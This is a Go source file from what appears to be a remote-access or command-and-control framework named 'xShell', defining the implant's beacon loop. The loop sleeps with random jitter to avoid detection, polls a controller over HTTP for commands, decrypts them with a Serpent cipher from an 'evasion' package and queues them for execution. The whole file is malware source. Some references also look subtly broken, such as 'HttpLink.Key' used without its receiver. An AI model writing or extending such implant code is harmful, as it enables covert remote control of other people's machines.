package internal

import (
	"io"
	"math/rand"
	"time"
	"xShell/payload/evasion"
)

type Beacon struct {
	Sleep    int
	Jitter   int
	HttpLink *Link
	Rqueue   *SafeRequestQueue
	Cqueue   *SafeCommandQueue
}

func (b *Beacon) Run() {
	rand.NewSource(time.Now().Unix())
	for {
		time.Sleep((time.Duration(b.Sleep) + time.Duration(rand.Intn(b.Jitter))) * time.Second)
		if nextReq := b.Rqueue.GetNext(); nextReq != nil {
			SendRequest(nextReq)
			newCmdReq, err := b.HttpLink.NewCmdRequest()
			if err != nil {
				continue
			}
			resp, err := SendRequest(newCmdReq)
			if err != nil {
				continue
			}
			if resp.Body == nil {
				continue
			}
			body, err := io.ReadAll(resp.Body)
			if err != nil {
				continue
			}
			decrypt, err := evasion.SerpentDecrypt(body, HttpLink.Key)
			if err != nil {
				continue
			}
			command := string(decrypt)
			b.Cqueue.Add(&command)
		} else if nextReq == nil {
			newCmdReq, err := b.HttpLink.NewCmdRequest()
			if err != nil {
				continue
			}
			resp, err := SendRequest(newCmdReq)
			if err != nil {
				continue
			}
			if resp.Body == nil {
				continue
			}
			body, err := io.ReadAll(resp.Body)
			if err != nil {
				continue
			}
			decrypt, err := evasion.SerpentDecrypt(body, HttpLink.Key)
			if err != nil {
				continue
			}
			command := string(decrypt)
			b.Cqueue.Add(&command)
		}
	}
}
